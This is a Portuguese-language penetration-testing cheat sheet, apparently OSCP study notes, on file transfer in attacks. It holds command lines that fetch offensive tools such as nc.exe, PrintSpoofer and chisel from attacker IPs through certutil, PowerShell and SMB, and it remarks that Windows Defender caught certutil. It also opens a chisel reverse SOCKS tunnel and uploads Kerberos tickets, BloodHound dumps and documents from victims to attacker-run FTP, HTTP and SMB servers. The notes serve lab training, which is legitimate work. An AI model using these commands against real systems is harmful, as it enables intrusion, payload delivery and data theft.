Transfering files
========================


# Downloading 

## FTP
Preparing FTP server 

    sudo apt update
    sudo apt install pure-ftpd
    
    
Script para setup adequado do serviço FTP
       
    cat ./setup-ftp.sh
    
    #!/bin/bash

    sudo groupadd ftpgroup
    sudo useradd -g ftpgroup -d /dev/null -s /etc ftpuser
    sudo pure-pw useradd offsec -u ftpuser -d /home/kali/ownCloud/owncloud/Area_de_trabalho/estudos/oscp/ftphome
    sudo pure-pw mkdb
    cd /etc/pure-ftpd/auth/
    sudo ln -s ../conf/PureDB 60pdb
    #sudo mkdir -p /ftphome
    sudo chown -R ftpuser:ftpgroup /home/kali/ownCloud/owncloud/Area_de_trabalho/estudos/oscp/ftphome
    sudo systemctl restart pure-ftpd

O windows como cliente ficaria com os seguntes comandos:

    ftp -n -v
    open 192.168.0.253
    user offsec
    lab
    bin
    get nc.exe
    bye
    
onde:

-n é para evitaar a solicitação de prompt de login
-v para evitar verbose output

open: inicia a conexão com o IP do atacante
user: informar usuário e senha
bin: modo binário de transferência
get: obter um determinado arquivo

OBS: Existe a opção de mget também, para obter diversos arquivos de uma vez

Para fazer isso de maneira não interativa, podemos informar o parâmetro "-s"

e salvar os seguintes comandos em um arquivo:

    open 192.168.0.253
    user offsec
    lab
    bin
    get nc.exe
    bye
Salvando esses comandos em um arquivo chamado "comandos_ftp.txt", executar :

ftp -n -v -s:comandos_ftp.txt

## HTTP

### VBS

Apartir deste script a gente consegue 

    type wget.vbs
    
    strUrl = WScript.Arguments.Item(0) 
    StrFile = WScript.Arguments.Item(1) 
    Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 
    Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 
    Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 
    Const HTTPREQUEST_PROXYSETTING_PROXY = 2 
    Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts 
     Err.Clear 
     Set http = Nothing 
     Set http = CreateObject("WinHttp.WinHttpRequest.5.1") 
     If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") 
     If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") 
     If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") 
     http.Open "GET", strURL, False 
     http.Send 
     varByteArray = http.ResponseBody 
     Set http = Nothing 
     Set fs = CreateObject("Scripting.FileSystemObject") 
     Set ts = fs.CreateTextFile(StrFile, True) 
     strData = "" 
     strBuffer = "" 
     For lngCounter = 0 to UBound(varByteArray) 
     ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) 
     Next 
     ts.Close 


### certutil

OBS: Esse cara complicou a vida por conta do AV Defender em tempo real... Foi pego. do powershell funciona normalmente

    certutil -urlcache -split -f "http://192.168.0.253:8000/nc.cmd" nc.hex
    
    certutil -urlcache -split -f "http://192.168.49.120:8000/PrintSpoofer64.exe" ps64.exe
    certutil -urlcache -split -f "http://192.168.49.120:8000/chisel.exe" chisel.exe
    .]chisel.exe client 13.37.13.37:3477 R:5000:socks
### powershell

    powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')
    
    powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'C:/temp/new-exploit.exe')

    powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
    

### Bash

    wget -r --no-parent http://10.10.14.2/folder  
    wget http://10.10.14.2/folder/file.pdf 

## SMB

    cp \\192.168.0.253\share\vulns.csv vulns.csv
    
    copy \\192.168.119.181\smb\PrintSpoofer64.exe ps.exe

 OBS: não esquecer de colcoar a flag "smb2support" no comando
 
     impacket-smbserver -smb2support share .



    cp 20220915120636_BloodHound.zip \\test: 192.168.49.120\smb\20220915120636_BloodHound.zip

### Crackmapexec

    #~ crackmapexec smb 172.16.251.152 -u user -p pass --get-file  \\Windows\\Temp\\whoami.txt /tmp/whoami.txt


# Uploading

## FTP

Aopção mais fácil é por meio do python:

    python -m pyftpdlib --port=21 --write
    #ou
    python -m pyftpdlib --directory=FTP --port=2121 --write

    anonymous
    anonymous

Existe a possibilidade de fazer upload de arquivos com Windows por meio do FTP também da seguinte forma:

    ftp -n -v
    open 192.168.0.253
    user offsec
    lab
    ascii
    put nc.txt nome_do_arq_no_server.txt
    bye

onde:

-n é para evitaar a solicitação de prompt de login
-v para evitar verbose output

open: inicia a conexão com o IP do atacante
user: informar usuário e senha
ascii: é para mudar o modo de transferência para ascii
put source dest: enviar arquivo

Para fazer isso de maneira não interativa, podemos informar o parâmetro "-s"

e salvar os seguintes comandos em um arquivo:

    open 192.168.0.253
    user offsec
    lab
    ascii
    put nc.exe
    bye
Salvando esses comandos em um arquivo chamado "comandos_ftp.txt", executar :

    ftp -n -v -s:comandos_ftp.txt


### powershell

    $client = New-Object System.Net.WebClient;$client.Credentials = New-Object System.Net.NetworkCredential("anonymous", "anonymous");$client.UploadFile("ftp://10.10.14.14/test.kirbi", "C:\temp\1-40a10000-sqlsvc@MSSQLSvc~dc1.scrm.local~1433-SCRM.LOCAL.kirbi")

 
## HTTP

### powershell

    #Method POST (este não funciona com o script do python para PUT requests)
    powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')
    
    #Method PUT
    invoke-webrequest http://192.168.0.253:5000/vulns.csv -Method PUT -infile vulns.csv -contenttype application/octet-stream
    
    invoke-webrequest http://192.168.49.120/20220915120636_BloodHound.zip -Method PUT -infile 20220915120636_BloodHound.zip -contenttype application/octet-stream
    
    #method PUT
    powershell (new-object system.net.webclient).uploadfile(http://192.168.119.16/upload.txt, 'put', important.docx)
    
    (new-object system.net.webclient).uploadfile('http://192.168.49.120/20220915120636_BloodHound', '20220915120636_BloodHound')

### python

    python3 -c 'import requests; import os; filename="test.txt"; length=os.path.getsize(filename); requests.put("http://127.0.0.1:8000/"+filename, data=open(filename, "r").read(length))'


## SMB

    cp vulns.csv \\192.168.0.253\share\vulns.csv

 OBS: não esquecer de colcoar a flag "smb2support" no comando
 
     impacket-smbserver -smb2support share .

Vale considerar que em alguns casos é necessário utilizar senhas para acesso a compartilhamento de arquivos. Nesse caso é necessário fazer o seguinte:

    net use \\10.10.14.4\smb /user:teste Test@123
    copy \\10.10.14.4\smb\PowerUp.ps1 pu.ps1

No caso do servidor fica:

    impacket-smbserver -smb2support -username teste -password Test@123 smb .

### crackmapexec

    crackmapexec smb 172.16.251.152 -u user -p pass --put-file /tmp/whoami.txt \\Windows\\Temp\\whoami.txt
     
## TFTP

Não vem instalado nos sistemas operacinoais do windows 7 para cima
Somente windows XP, 2003 para baixo:

    tftp -i 10.11.0.4 put important.docx
    
## SSH
    
    scp -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" powershell-uploads acosta@192.168.119.165:/home/acosta/powershell-uploads
    
    
    $client.uploadfile('http://192.168.119.165/powershell-uploads','put', 'powershell-uploads')
    
    invoke-webrequest http://192.168.119.165:8000/upload -Method PUT -infile powershell-uploads -contenttype application/octet-stream
    
    scp -o "StrictHostKeyChecking=no" -o "UserKnownHostsFile=/dev/null" try-harder-ftp-service acosta@192.168.119.165:/home/acosta/
    
    scp -o "StrictHostKeyChecking=no" -o "UserKnownHostsFile=/dev/null" try-harder-ftp-service acosta@192.168.119.165:/home/kali/ownCloud/owncloud/Area_de_trabalho/estudos/oscp/ftphome